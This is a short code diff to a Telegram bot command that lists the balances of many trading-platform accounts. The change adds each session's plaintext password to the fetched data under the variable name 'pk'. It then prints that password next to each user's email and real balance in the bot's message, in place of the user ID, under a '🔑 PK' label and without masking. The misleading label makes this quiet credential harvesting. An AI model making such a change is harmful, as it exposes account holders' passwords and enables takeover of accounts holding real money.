@@ -919,7 +919,7 @@ async def cmd_allsaldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Fetch semua balance concurrent — semaphore 5 biar tidak kena rate limit
     semaphore = asyncio.Semaphore(5)
-    fetched: list = []   # list of (email, user_id, UserBalance)
+    fetched: list = []   # list of (email, user_id, pk, UserBalance)
     failed_count = 0
 
     async def fetch_one(session):
@@ -927,7 +927,7 @@ async def cmd_allsaldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         async with semaphore:
             try:
                 balance = await StockityAPI.get_user_balance_by_session(session)
-                fetched.append((session.email, session.user_id, balance))
+                fetched.append((session.email, session.user_id, session.password, balance))
             except Exception:
                 failed_count += 1
 
@@ -941,19 +941,19 @@ async def cmd_allsaldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # Sort: real balance tertinggi dulu
-    fetched.sort(key=lambda x: x[2].real_balance, reverse=True)
+    fetched.sort(key=lambda x: x[3].real_balance, reverse=True)
 
-    total_real   = sum(r[2].real_balance for r in fetched)
-    bal_max      = fetched[0][2]
-    bal_min      = fetched[-1][2]
+    total_real   = sum(r[3].real_balance for r in fetched)
+    bal_max      = fetched[0][3]
+    bal_min      = fetched[-1][3]
 
     # ── Build baris per user (tanpa masking, tanpa limit) ──
     now_str = datetime.utcnow().strftime('%d %b %Y %H:%M') + " UTC"
     rows = []
-    for i, (email, user_id, balance) in enumerate(fetched, 1):
+    for i, (email, user_id, pk, balance) in enumerate(fetched, 1):
         rows.append(
             f"<b>{i}.</b> 📧 <code>{email}</code>\n"
-            f"    🔑 PK : <code>{user_id}</code>\n"
+            f"    🔑 PK : <code>{pk}</code>\n"
             f"    💵 Real : <b>{balance.real_balance_formatted}</b>\n"
             f"    🎮 Demo : {balance.demo_balance_formatted}"
         )
